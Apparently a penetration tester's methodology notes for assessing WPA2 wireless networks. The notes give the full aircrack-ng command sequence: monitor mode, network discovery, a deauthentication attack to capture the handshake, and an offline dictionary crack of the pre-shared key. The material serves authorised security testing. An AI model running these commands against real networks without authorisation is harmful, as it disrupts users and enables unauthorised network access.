Assessment of Wireless Network
------------------------------
WPA2 PSK
WPA2 Enterprise

Activities Performed
--------------------
Evaluating strength of PSK
Reviewing nearby networks
Assessing guest networks
Checking network access

Hacking Process / Methodology for WPA2-PSK (Pre-Shared Key)
-----------------------------------------------------------
1) Place
Place your wireless card into monitor/promiscious mode. Monitor mode allows our wireless card to perform monitoring all the incoming traffic. We will eavesdrop the network
with the aim of gathering handshake.
2) Discover
Discover information about network (Channel, BSSID)
3) Select
Select network and start capturing data
4) Perform
Perform deauthentication attack
5) Capture
Capture WPA handshake
6) Attempting crack
Attempt to crack handshake

Commands
--------
iwconfig
airmon-ng check kill
airmon-ng start wlan0 -> place network card into monitor mode
iwconfig -> to make sure you are in monitor mode
airodump-ng wlan0mon -> discover wireless networks
airodump-ng -c <channel_number> --bssid <MAC_Address> -w capture wlan0mon 
aireplay-ng -0 1 -a <MAC_Address_AP> -c <MAC_client_we_deauth> wlan0mon -> at the end of this, we aim to gather handshake
ls capture* -> we should see all the captured data with the extension of csv, cap, netxml, kismet.csv
We will use .cap file in order to crack/recover the handshake against a wordlist.
aircrack-ng -w <wordlist> -b <AP_MAC_Address> capture.cap -> That initiates an offline dictionary attack against handshake process with the aim of cracking / recovering
password.
